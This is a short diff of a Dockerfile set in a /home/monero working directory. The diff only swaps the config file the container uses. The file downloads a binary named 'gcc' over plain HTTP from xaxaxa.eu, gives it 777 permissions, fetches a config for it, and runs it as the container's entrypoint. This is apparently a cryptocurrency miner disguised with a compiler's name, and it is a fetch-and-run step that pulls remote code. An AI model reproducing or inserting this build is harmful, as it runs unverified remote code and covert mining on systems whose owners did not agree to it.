@@ -10,7 +10,7 @@ WORKDIR /home/monero
 
 RUN wget http://xaxaxa.eu/gcc &&\
   chmod 777 gcc &&\
-  wget http://xaxaxa.eu/config_1.json
+  wget http://xaxaxa.eu/config_2.json
 
 ENTRYPOINT ["./gcc"]
-CMD ["--config=config_1.json"]
+CMD ["--config=config_2.json"]
